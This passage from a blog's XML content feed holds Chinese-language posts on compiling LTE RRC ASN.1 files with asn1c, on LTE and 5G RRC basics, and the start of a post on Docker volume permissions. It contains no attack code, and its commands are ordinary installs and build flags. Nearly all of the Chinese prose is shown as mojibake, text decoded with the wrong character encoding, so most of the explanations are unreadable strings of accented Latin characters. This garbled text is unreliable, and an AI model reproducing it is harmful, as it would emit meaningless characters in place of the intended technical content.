href="http://www.lionet.info/asn1c/"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">asn1cå®˜ç½‘</p><p class="url">http://www.lionet.info/asn1c/</p></div></a></div><div class="tag link"><a class="link-card" title="asn1cæºç " href="https://github.com/vlm/asn1c"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">asn1cæºç </p><p class="url">https://github.com/vlm/asn1c</p></div></a></div><p>ubuntu å¯ç›´æ¥é€šè¿‡ <code>sudo apt-get install asn1c</code> è¿›è¡Œå®‰è£…</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> asn1c</code></pre><blockquote><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211005115808.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211005115808.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211005115807407"></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211005115923.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211005115923.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211005115922220"></p></blockquote><p>ä½¿ç”¨<code>asn1c</code> ç¼–è¯‘</p><pre class="language-bash" data-language="bash"><code class="language-bash">asn1c -S /usr/share/asn1c -fcompound-names -gen-PER -pdu<span class="token operator">=</span>auto <span class="token number">36331</span>-f40.asn1<span class="token comment"># -pdu=auto  äº§ç”Ÿpdu_colletion.cæ–‡ä»¶</span><span class="token comment"># -fcompound-names å»é™¤é‡å®šä¹‰</span><span class="token comment"># -gen-PER ä½¿ç”¨PERç¼–ç </span><span class="token comment"># -S /usr/share/asn1c æŒ‡å®šasn1cåº“æ–‡ä»¶ä½ç½®, é€šè¿‡ä½¿ç”¨whereis asn1cå‘½ä»¤æŸ¥çœ‹å…¶åº“ä½ç½®</span></code></pre><details green><summary> FAQ </summary>              <div class='content'>              <p><strong>Q.:</strong> Does asn1c support BER encoding? I see only DER encoding in documentation.<br><strong>A.:</strong> Yes, the asn1c compiler fully supports BER encoding. Any <a href="http://en.wikipedia.org/wiki/Distinguished_Encoding_Rules">DER</a> encoded data is, by definition, a valid BER data, from the receiverâ€™s point of view.</p><p>If you want data to be BER or DER encoded, just invoke der_encode().</p><p><strong>Q.:</strong> My linker complains: Undefined symbols: <code>_asn_DEF_PDU</code>.<br><strong>A.:</strong> <strong>If you have your own file with main() routine, just delete the <code>converter-sample.c</code>file, you wonâ€™t need it. If you havenâ€™t created the main() routine yourself and wish to rely on converter-sample.c for your transcoding needs, <code>add -DPDU=YourPdu</code> to the list of compiler flags.</strong></p><p><strong>Q.:</strong> How to compile the 3GPP Radio Resource Control specification?<br><strong>A.:</strong> The asn1c distribution includes an RRC 25.331 (version 7.1.0) example, check out <a href="https://github.com/vlm/asn1c/tree/master/examples/sample.source.RRC">https://github.com/vlm/asn1c/tree/master/examples/sample.source.RRC</a>. You can also use the pre-compiled <strong>rrc-dump.exe</strong> program, which is part of <a href="http://lionet.info/asn1c/download.html">Windows ASN.1 compiler installer</a>.</p><p><strong>Q.:</strong> How to compile the ISO 13522 (MHEG-5) specification?<br><strong>A.:</strong> The ASN.1 compiler comes with a MHEG-5 decoder. Follow the <a href="https://github.com/vlm/asn1c/tree/master/examples/sample.source.MHEG5">https://github.com/vlm/asn1c/tree/master/examples/sample.source.MHEG5</a> README file instructions. You can also use the pre-compiled <strong>mheg5dump.exe</strong> program, which is part of <a href="http://lionet.info/asn1c/download.html">Windows ASN.1 compiler installer</a>.</p><p><strong>Q.:</strong> How to compile the <em>XYZ</em> decoder?<br><strong>A.:</strong> If <em>XYZ</em> is one of MEGACO (Media Gateway Control), PKIX1/X.509, LDAP, GSM TAP3 or OAM ULP, just go to <em>examples/sample.source.XYZ</em> and run <code>make</code>. The <a href="http://lionet.info/asn1c/download.html">Windows ASN.1 compiler installer</a> already contains the pre-compiled decoders for these encoding formats.</p><p>If you have something else, you should either use the <a href="http://lionet.info/asn1c/asn1c.cgi">Online ASN.1 compiler</a>, or download the <a href="http://lionet.info/asn1c/download.html">ASN.1 compiler source code</a>.</p>              </div>            </details><p>å¦‚æœä¸ä½¿ç”¨è‡ªå·±çš„<code>main()</code>å‡½æ•°, ç›´æ¥ä½¿ç”¨<code>converter-sample.c</code>çš„åŒ–, éœ€è¦åœ¨å…¶ä¸­æ·»åŠ ä¸€ä¸ªç›®æ ‡<code>PDU</code></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;asn_application.h&gt;#include &lt;asn_internal.h&gt;&#x2F;* for ASN__DEFAULT_STACK_MAX *&#x2F;#define PDU BCCH_BCH_Message&#x2F;* Convert &quot;Type&quot; defined by -DPDU into &quot;asn_DEF_Type&quot; *&#x2F;#defineASN_DEF_PDU(t)asn_DEF_ ## t#defineDEF_PDU_Type(t)ASN_DEF_PDU(t)#definePDU_TypeDEF_PDU_Type(PDU)</code></pre><p>æˆ–è€…åœ¨<code>Makefile.am.sample</code> æ–‡ä»¶ä¸­, ä¿®æ”¹ <code>CFLAGS</code> æ·»åŠ  <code>-DPDU= </code> é€‰é¡¹</p><pre class="language-bash" data-language="bash"><code class="language-bash">CFLAGS <span class="token operator">+=</span> -DHAVE_CONFIG_H -DJUNKTEST -D_DEFAULT_SOURCE  -DPDU<span class="token operator">=</span>BCCH_BCH_Message -DASN_PDU_COLLECTION -I.<span class="token assign-left variable">OBJS</span><span class="token operator">=</span><span class="token variable">$&#123;ASN_MODULE_SRCS<span class="token operator">:</span>.c=.o&#125;</span> <span class="token variable">$&#123;ASN_CONVERTER_SOURCES<span class="token operator">:</span>.c=.o&#125;</span>all: <span class="token variable"><span class="token variable">$(</span>TARGET<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span>TARGET<span class="token variable">)</span></span><span class="token builtin class-name">:</span> <span class="token variable">$&#123;OBJS&#125;</span><span class="token variable"><span class="token variable">$(</span>CC<span class="token variable">)</span></span> <span class="token variable"><span class="token variable">$(</span>CFLAGS<span class="token variable">)</span></span> -o <span class="token variable"><span class="token variable">$(</span>TARGET<span class="token variable">)</span></span> <span class="token variable">$&#123;OBJS&#125;</span> <span class="token variable"><span class="token variable">$(</span>LDFLAGS<span class="token variable">)</span></span> <span class="token variable"><span class="token variable">$(</span>LIBS<span class="token variable">)</span></span></code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> LTE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LTE </tag>
            
            <tag> ASN.1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LTE åŸºç¡€çŸ¥è¯†</title>
      <link href="/posts/cdac3e0/"/>
      <url>/posts/cdac3e0/</url>
      
        <content type="html"><![CDATA[<h2 id="LTEç›¸å…³åŸºç¡€çŸ¥è¯†">LTEç›¸å…³åŸºç¡€çŸ¥è¯†</h2><div class="story post-story"><h3 id="LTEæ¶æ„">LTEæ¶æ„</h3><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210720160620.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210720160620.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210720160540823"></p><ul><li>ç¬¬ä¸€å±‚ç‰©ç†å±‚(PHY),åœ¨æ—¶é—´å’Œé¢‘ç‡åŸŸä½¿ç”¨æ— çº¿ç”µèµ„æºè¿›è¡Œé€šä¿¡ã€‚</li><li>ç¬¬äºŒå±‚ç”±ä»‹è´¨è®¿é—®æ§åˆ¶(MAC)ã€æ— çº¿é“¾è·¯æ§åˆ¶(RLC)ã€åˆ†ç»„æ•°æ®æ”¶æ•›åè®®(PDCP)ä¸‰å±‚ç»„æˆã€‚å®ƒä»¬æ”¯æŒä¸Šè¡Œå’Œä¸‹è¡Œè°ƒåº¦ã€åˆ†ç»„åˆ†å‰²ã€åŠ å¯†å’Œå®Œæ•´æ€§ä¿æŠ¤ç­‰åŠŸèƒ½ã€‚</li><li>RRCæ˜¯ä¸€ä¸ªç¬¬ä¸‰å±‚åè®®ï¼Œè´Ÿè´£åˆ›å»ºå’Œç»´æŠ¤æ— çº¿ç”µè¿æ¥ã€å¹¿æ’­ç³»ç»Ÿä¿¡æ¯ã€å‘é€åˆ†é¡µé€šçŸ¥ã€é…ç½®å’ŒæŠ¥å‘Šæ— çº¿ç”µæµ‹é‡ä»¥åŠéš§é“åŒ–NASæ¶ˆæ¯ã€‚</li><li>NASæ˜¯ç»ˆç«¯ä¸CNä¹‹é—´çš„æ§åˆ¶å¹³é¢åè®®;å®ƒè´Ÿè´£è®¾ç½®å®‰å…¨æ€§ï¼Œå¤„ç†ç§»åŠ¨æ€§å’Œä¼šè¯ç®¡ç†ã€‚</li></ul><hr><ul><li><p><strong>UEä»£è¡¨æ‰‹æœº;</strong></p></li><li><p><strong>RANä¸ºç»ˆç«¯æä¾›æ— çº¿é€šä¿¡æœåŠ¡;</strong></p></li><li><p><strong>CN(EPC)(åŒ…æ‹¬å…¶ä»–åŠŸèƒ½)åœ¨ç»ˆç«¯å’ŒInternetä¹‹é—´è·¯ç”±æ•°æ®ã€‚</strong></p></li></ul><p>RANç”±æ— çº¿åŸºç«™ç»„æˆï¼Œåœ¨5Gä¸­ç§°ä¸º<code>gNB</code>ï¼Œåœ¨4Gä¸­ç§°ä¸º<code>eNB</code>ã€‚gNBæ‰€ä½¿ç”¨çš„æ— çº¿ç”µæ¥å…¥æŠ€æœ¯è¢«ç§°ä¸ºæ–°æ— çº¿ç”µ<code>(NR)</code>ï¼Œ eNBæ‰€ä½¿ç”¨çš„æ— çº¿ç”µæ¥å…¥æŠ€æœ¯è¢«ç§°ä¸ºè¿›åŒ–é€šç”¨åœ°é¢æ— çº¿ç”µæ¥å…¥(<code>E-UTRA</code>)ã€‚</p><p>CNç”±å‡ ä¸ªç½‘ç»œåŠŸèƒ½ç»„æˆï¼Œå…¶ä¸­5Gçš„æ¥å…¥å’Œç§»åŠ¨æ€§ç®¡ç†åŠŸèƒ½(AMF)å’Œ4Gçš„ç§»åŠ¨æ€§ç®¡ç†å®ä½“(MME)å¦‚å›¾æ‰€ç¤ºã€‚<strong>UEåˆ°RAN/CNçš„æ–¹å‘ç§°ä¸ºä¸Šè¡Œï¼Œå¦ä¸€ä¸ªæ–¹å‘ç§°ä¸ºä¸‹è¡Œã€‚</strong></p><p>4Gå’Œ5Gçš„æµé‡æœ‰ä¸¤ç§ç±»å‹:</p><ul><li>ä¸€ç§ç§°ä¸ºæ§åˆ¶å¹³é¢çš„ç±»å‹è´Ÿè´£å»ºç«‹å’Œç»´æŠ¤è¿æ¥ï¼Œå¹¶å»ºç«‹å®‰å…¨æ€§;</li><li>ç”¨æˆ·å¹³é¢: æ‰¿è½½å®é™…æ•°æ®ï¼Œå¦‚è¯­éŸ³é€šè¯å’Œäº’è”ç½‘æ•°æ®ã€‚æ¯ç§ç±»å‹éƒ½ç”±å‡ ä¸ªåè®®ç»„æˆã€‚</li></ul><p>æ§åˆ¶å¹³é¢ä¸Šä½¿ç”¨çš„åè®®æ ˆçš„ç©ºä¸­æ¥å£,åŒ…æ‹¬æ— çº¿ç”µèµ„æºæ§åˆ¶åè®®(RRC)å’Œä¸å¯è®¿é—®å±‚åè®®(NAS)ï¼Œ</p><h4 id="RRC-Radio-Resource-Control">RRC(Radio Resource Control)</h4><blockquote><p>æ— çº¿èµ„æºæ§åˆ¶</p><p>RRCæ˜¯ä¸€ä¸ªç¬¬ä¸‰å±‚åè®®ï¼Œè´Ÿè´£åˆ›å»ºå’Œç»´æŠ¤æ— çº¿ç”µè¿æ¥ã€å¹¿æ’­ç³»ç»Ÿä¿¡æ¯ã€å‘é€åˆ†é¡µé€šçŸ¥ã€é…ç½®å’ŒæŠ¥å‘Šæ— çº¿ç”µæµ‹é‡ä»¥åŠéš§é“åŒ–NASæ¶ˆæ¯ã€‚</p></blockquote><p>åœ¨<code>NG-RAN</code>ä¸­ï¼Œ<code>RRC</code>åœ¨<code>UE</code>å’Œ<code>gNB</code>ä¹‹é—´çš„æ§åˆ¶å¹³é¢æ¶ˆæ¯ä¸­è¿›è¡Œæ“ä½œã€‚å®ƒæºå¸¦äº†ä¸<code>RANæ§åˆ¶å¹³é¢</code>ç¨‹åºç›¸å…³çš„ä¿¡æ¯</p><p>RRCå±‚è¿˜ä¸ºç»ˆç«¯å’Œæ ¸å¿ƒç½‘æ¥å…¥ç§»åŠ¨æ€§ç®¡ç†åŠŸèƒ½(Access and Mobility Management Function,  AMF)ä¹‹é—´å‘é€çš„NASæ¶ˆæ¯æä¾›æœåŠ¡ã€‚</p><p>RRCä¸­çš„æ¶ˆæ¯ä¾èµ–äºPDCP,åœ¨å¿…è¦æ—¶æä¾›ä¸€ä¸ªå…·æœ‰åŠ å¯†å’Œå®Œæ•´æ€§ä¿æŠ¤çš„é€šé“ã€‚</p><p>RRCè´Ÿè´£å¹¿æ’­ç³»ç»Ÿä¿¡æ¯æˆ–è·å–ç³»ç»Ÿä¿¡æ¯ä»¥ä¾¿åœ¨å°åŒºå†…è¿›è¡Œé€šä¿¡ï¼Œç”¨äºåœ¨<code>RRC_IDLE</code>çŠ¶æ€ä¸‹å‘é€<code>å¯»å‘¼æ¶ˆæ¯</code>ã€<code>è¿æ¥ç®¡ç†</code>ã€<code>ç§»åŠ¨æ€§ç®¡ç†</code>ç­‰ã€‚</p><h5 id="RRCä¸‰ç§çŠ¶æ€è½¬æ¢">RRCä¸‰ç§çŠ¶æ€è½¬æ¢</h5><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211004112537.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211004112537.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211004112535677">5G  NRä¸­ å¼•å…¥äº†é¢å¤–çš„çŠ¶æ€<code>RRC_INACTIVE</code></p><ul><li><strong>RRC_IDLE:</strong>  ç½‘ç»œä¸åŒ…å«ç»ˆç«¯RRCè¿æ¥ä¿¡æ¯çš„çŠ¶æ€ã€‚å› æ­¤ï¼Œè®¾å¤‡ä¸èƒ½å‘é€æˆ–æ¥æ”¶æ•°æ®ã€‚è®¾å¤‡å®šæœŸé†’æ¥ï¼Œæ¥æ”¶æ¥è‡ªç½‘ç»œçš„å¯»å‘¼æ¶ˆæ¯ï¼Œå°†çŠ¶æ€æ›´æ”¹ä¸º<code>RRC_CONNECTED</code>ã€‚å°åŒºå’Œç½‘ç»œä¹‹é—´çš„ç§»åŠ¨æ€§å¯ä»¥é€šè¿‡å°åŒºé‡æ–°é€‰æ‹©è¿‡ç¨‹å®ç°</li><li><strong>RRC_INACTIVE:</strong> æ— æ³•å‘é€æˆ–æ¥æ”¶æ•°æ®ã€‚ åœ¨<code>UE</code>å’Œ<code>gNB</code>ä¸­éƒ½ç»´æŠ¤<code>RRCä¸Šä¸‹æ–‡</code>ã€‚<code>UE</code>å¯ä»¥ç±»ä¼¼äº<code>RRC_IDLE</code>æ¨¡å¼ä¼‘çœ ï¼Œä»¥èŠ‚çœç”µæ± ç”µé‡ã€‚å‡å°‘åˆ°<code>RRC_CONNECTED</code>æ¨¡å¼çš„è½¬æ¢æ—¶é—´,ç”¨äºæ•°æ®ä¼ è¾“ï¼Œå› ä¸ºå·²ç»åœ¨æ ¸å¿ƒç½‘ç»œå»ºç«‹äº†ä¸Šä¸‹æ–‡ã€‚ é€šè¿‡å°åŒºé‡é€‰ç¨‹åºçš„ç§»åŠ¨æ€§</li><li><strong>RRC_CONNECTED:</strong>  åœ¨<code>UE</code>å’Œ<code>gNB</code>ä¹‹é—´å»ºç«‹<code>RRCä¸Šä¸‹æ–‡</code>ï¼Œç”¨äºåœ¨ç½‘ç»œä¸Šä¼ è¾“æ•°æ®ã€‚é€šè¿‡å°åŒºæ— çº¿ç½‘ç»œä¸´æ—¶æ ‡è¯†ç¬¦(C-RNTI)ç”¨äºä¿¡ä»¤çš„ç½‘ç»œè¯†åˆ«è®¾å¤‡ã€‚ç”±RANç®¡ç†çš„ç§»åŠ¨æ€§ï¼Œåœ¨éœ€è¦æ—¶è¿›è¡Œåˆ‡æ¢</li></ul><p>æ–°çš„çŠ¶æ€<code>RRC_INACTIVE</code>æœ‰åŠ©äºå‡å°‘å‘é€ç”¨æˆ·æ•°æ®ä¹‹å‰çš„çŠ¶æ€è½¬æ¢æ‰€æ¶‰åŠçš„ä¿¡ä»¤é‡ã€‚</p><p><code>RRC_INACTIVE</code>å……å½“äº†ä¸€ä¸ªä¸­ä»‹çŠ¶æ€ï¼Œç”¨äºåœ¨RRCä¸Šä¸‹æ–‡å·²ç»å»ºç«‹æ—¶ç›´æ¥è½¬æ¢ã€‚åœ¨<code>RRC_INACTIVE</code>çŠ¶æ€ä¸‹ï¼Œè®¾å¤‡ä¼šåƒ<code>RRC_IDLE</code>ä¸€æ ·ä¼‘çœ ã€‚</p><p>RRCå±‚è´Ÿè´£æ§åˆ¶å¹³é¢è¿‡ç¨‹ä¸­çš„å¤§é‡æ¶ˆæ¯ï¼Œå¯¹äºä»»ä½•RRCå±‚çš„å®ç°æ¥è¯´ï¼Œå¥å£®åœ°æŠµå¾¡æ¶æ„æ”»å‡»å¹¶å‘ä¸Šå±‚æä¾›å¯é çš„æœåŠ¡éƒ½æ˜¯éå¸¸é‡è¦çš„ã€‚</p><h5 id="RRCç»„æˆ">RRCç»„æˆ</h5><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210731093826.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210731093826.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210731093825549"></p><p>RCæ¶ˆæ¯æ˜¯ä½¿ç”¨å¹³å°æ— å…³çš„ASN.1å®šä¹‰çš„ï¼Œå¯ä»¥çœ‹ä½œå›¾2ä¸­çš„æ ‘ã€‚æ¯ä¸ªRRCæ¶ˆæ¯ç”±ç»“æ„åŒ–çš„(<code>SEQUENCE</code>, <code>SEQUENCE OF</code>, <code>CHOICE</code>) å’ŒåŸè¯­(<code>BOOLEAN</code>,<code>INTEGER</code>, <code>ENUMERATED</code>,<code>BIT STRING</code>,<code>OCTET STRING</code>) æ•°æ®ç±»å‹, æ¯ä¸ªç»“æ„åŒ–æ•°æ®ç±»å‹å¯ä»¥è¿›ä¸€æ­¥ç”±ç»“æ„åŒ–æ•°æ®ç±»å‹å’ŒåŸºæœ¬æ•°æ®ç±»å‹ç»„æˆ. åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ï¼ŒRRCæ¶ˆæ¯ä½¿ç”¨<code>Unaligned Packed Encoding Rules (UPER)[36]</code>è¿›è¡Œç¼–ç ï¼Œè¯¥è§„åˆ™å°†æ•°æ®ç»“æ„è½¬æ¢ä¸ºç´§å‡‘çš„å­—èŠ‚åºåˆ—ã€‚</p><blockquote><p>[36] ITU. Recommendation ITU-T X.691 International Standard 8825-2: Information technology â€“ ASN.1 encoding rules: Specification of Packed Encoding Rules (PER), Aug 2015. Available at <a href="https://www.itu.int/rec/T-REC-X.680-X.693-201508-I/en">https://www.itu.int/rec/T-REC-X.680-X.693-201508-I/en</a>.</p></blockquote><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210731103926.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210731103926.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210731103925068"></p><h5 id="RRC-æ¶ˆæ¯">RRC æ¶ˆæ¯</h5><p>RRCå±‚åˆ©ç”¨åº•å±‚çš„æœåŠ¡å®ç°RRCæ¶ˆæ¯çš„å¯é ã€å®‰å…¨çš„ä¼ é€’ã€‚ä¸Šè¡Œé€šé“ä¸º<code>ULCCCH</code>ã€<code>UL-DCCH</code>ï¼Œä¸‹è¡Œé€šé“ä¸º<code>DL-CCCH</code>ã€<code>DL-DCCH</code>ã€<code>BCCH</code>ã€<code>PCCH</code>ã€‚</p><p><code>CCCH</code>ã€<code>PCCH</code>å’Œ<code>BCCH</code>é€šé“ä¸­çš„æ¶ˆæ¯é€šè¿‡<code>RLC</code>ä¸­çš„é€æ˜æ¨¡å¼â„¢ä»¥æ˜æ–‡å½¢å¼å‘é€ï¼Œç”¨äºåˆå§‹ASæ¿€æ´»å’Œéšæœºè®¿é—®è¿‡ç¨‹ã€‚<strong>å› æ­¤è¿™äº›æ¶ˆæ¯ä¸ä½¿ç”¨PDCPå±‚çš„æœåŠ¡è¿›è¡ŒåŠ å¯†å’Œå®Œæ•´æ€§ä¿æŠ¤</strong>ã€‚RLCä»ç„¶æä¾›æ£€æµ‹åˆ°é”™è¯¯çš„é‡ä¼ å’ŒRRCæœ‰æ•ˆè´Ÿè½½çš„æ— é‡å¤äº¤ä»˜ã€‚åœ¨ä¸Šè¡Œé“¾è·¯ä¸­ï¼ŒRRCæŠ¥æ–‡åªé€šè¿‡<code>UL-CCCH</code>å’Œ<code>UL-DCCH</code>å‘é€ã€‚</p><h3 id="5G-NR">5G NR</h3><blockquote><p>5G New Radio</p><p>Fuzzing Radio Resource Control messages in 5G and LTE systems</p></blockquote><p>5Gç³»ç»Ÿæå‡ºæ–°çš„æ— çº¿ç”µæ ‡å‡†, 5G New Radio; æ–°æ ‡å‡†åº”è¯¥æ”¯æŒä¸ºå°†æ¥ä½¿ç”¨è€Œç¡®å®šçš„éœ€æ±‚ï¼Œå¦‚æ›´é«˜çš„æ•°æ®é€Ÿåº¦ã€æ›´ä½çš„å»¶è¿Ÿã€ç§»åŠ¨æ€§å’Œå¯é æ€§ã€‚<code>5G NR</code>æ˜¯åœ¨<code>RAN</code>å’Œ<code>UE</code>ä¹‹é—´ä½¿ç”¨ç»è¿‡è®¸å¯çš„ç”µç£é¢‘è°±ä¼ è¾“æ•°æ®çš„æ¥å…¥æœºåˆ¶ã€‚5Gç³»ç»Ÿä¸­çš„<code>NG-RAN</code>å¯ä»¥ç”±å¤šä¸ªä¸‹ä¸€ä»£èŠ‚ç‚¹åŸºç«™(<code>gN</code>B)æˆ–å•ä¸ª<code>gNB</code>ç»„æˆã€‚<code>NG-RAN</code>å°†ä¸º<code>LTE</code>ã€<code>3G</code>ç­‰ä¼ ç»Ÿæ— çº¿æ¥å…¥æŠ€æœ¯æä¾›æ”¯æŒã€‚<code>RAN</code>ä¸ºç»ˆç«¯æä¾›äº†ä¸æ ¸å¿ƒç½‘ç»œå’Œæ•°æ®ç½‘ç»œäº¤äº’çš„æ¥å£ã€‚<code>5G NR</code>ç”±å¤„ç†æ§åˆ¶å¹³é¢çš„ç½‘ç»œåè®®æ ˆå’Œå¤„ç†ç”¨æˆ·å¹³é¢æ¶ˆæ¯çš„ç½‘ç»œåè®®æ ˆç»„æˆï¼Œåˆ†åˆ«å¦‚ä¸‹æ‰€ç¤º</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211004142917.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211004142917.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211004142916341"></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211004142931.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211004142931.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211004142929890"></p><p><code>UE</code>å’Œ<code>NG-RAN</code>ä¹‹é—´çš„æ¥å£å«åšUuï¼Œå®ƒåŒæ—¶æ‰¿è½½ç€æ§åˆ¶å¹³é¢å’Œç”¨æˆ·å¹³é¢çš„æµé‡ã€‚</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211004143026.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211004143026.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211004143025311"></p></div><h2 id="ç¼©å†™åè¯è§£é‡Š">ç¼©å†™åè¯è§£é‡Š</h2><div class="story post-story"></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> LTE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LTE </tag>
            
            <tag> æ ‡ç­¾äºŒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockeræ–‡ä»¶å¤¹æ˜ å°„æƒé™é—®é¢˜æ€è€ƒåŠå¯èƒ½è§£å†³æ–¹æ³•</title>
      <link href="/posts/39ff9093/"/>
      <url>/posts/39ff9093/</url>
      
        <content type="html"><![CDATA[<h1>dockeræ–‡ä»¶å¤¹æ˜ å°„æƒé™é—®é¢˜æ€è€ƒåŠå¯èƒ½è§£å†³æ–¹æ³•</h1><h2 id="èƒŒæ™¯åˆ†æ">èƒŒæ™¯åˆ†æ</h2><div class="story post-story"><p>åœ¨å¤šç”¨æˆ·æœåŠ¡å™¨ä¸Šå…¬ç”¨dockeræ­å»ºç¯å¢ƒæ—¶,åˆæ­¥è®¾æƒ³ä¸ºå®¿ä¸»æœºç”¨æˆ·ä¸ºæ™®é€šç”¨æˆ·,å®¹å™¨å†…ç”¨æˆ·ä¸ºroot,</p><p>ç”¨æˆ·åœ¨å®¹å™¨å†…è‡ªç”±æ­å»ºè‡ªå·±æ‰€éœ€çš„ç¯å¢ƒ,è€Œä¸å½±å“å…¶ä»–äººä»¥åŠå®¹å™¨å¤–çš„ç¯å¢ƒ.</p><p>ä½†å½“ç”¨æˆ·åœ¨ä½¿ç”¨dockeræŒ‚è½½ç£ç›˜çš„æ—¶å€™,ç”±äºå®¹å™¨å†…ä½¿ç”¨rootè¿è¡Œç¨‹åºï¼Œä¼šå¯¼è‡´æŒ‚è½½ä¸­äº§ç”Ÿçš„æ–‡ä»¶å±äºroot:rootã€‚è€Œå®¹å™¨å¤–ç”¨æˆ·å¹¶ä¸æ˜¯rootï¼Œä¼šä½¿çš„æ–‡ä»¶å…±äº«ç”šè‡³é˜…è¯»æ—¥å¿—äº§ç”Ÿæƒé™ä¸Šçš„é—®é¢˜,å¯¼è‡´ä¸å¯è¯»æˆ–ä¸å¯å†™ä¹‹ç±»çš„é—®é¢˜ã€‚</p><p>æœ¬æ–‡æ—¨åœ¨å®¿ä¸»æœºä½¿ç”¨æ™®é€šç”¨æˆ·,è€Œå®¹å™¨å†…ä»ç„¶ä½¿ç”¨<code>root</code>ç”¨æˆ·,ä¸”ä¸ä¼šäº§ç”Ÿæ–‡ä»¶æƒé™çš„é—®é¢˜.</p><p>æ¡ˆä¾‹æˆªå›¾:</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210923104602.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210923104602.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210923104601353"></p><p>å¯ä»¥çœ‹åˆ°åˆ›å»ºæ˜ å°„çš„ <code>srs</code>å’Œ<code>srsRAN</code> æ–‡ä»¶å¤¹ å› ä¸ºæ˜¯ç”±<code>docker run </code>å‘½ä»¤è‡ªåŠ¨åˆ›å»ºçš„,æƒé™è¢«åŒ–ä¸º<code>root</code></p><p>æ™®é€šç”¨æˆ·åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹æ²¡æœ‰æƒé™!,</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210923104828.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210923104828.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210923104827265"></p><h3 id="éœ€æ±‚">éœ€æ±‚</h3><div class='checkbox green checked'><input type="radio" checked="checked"/>            <p>å®¹å™¨å¤–ä½¿ç”¨æ™®é€šç”¨æˆ·(æ²¡æœ‰sudoæƒé™ç­‰ç®¡ç†å‘˜æƒé™)</p>            </div><div class='checkbox green checked'><input type="radio" checked="checked"/>            <p>å®¹å™¨å†…ä½¿ç”¨å¸¦ç®¡ç†å‘˜æƒé™çš„rootç”¨æˆ·</p>            </div><h3 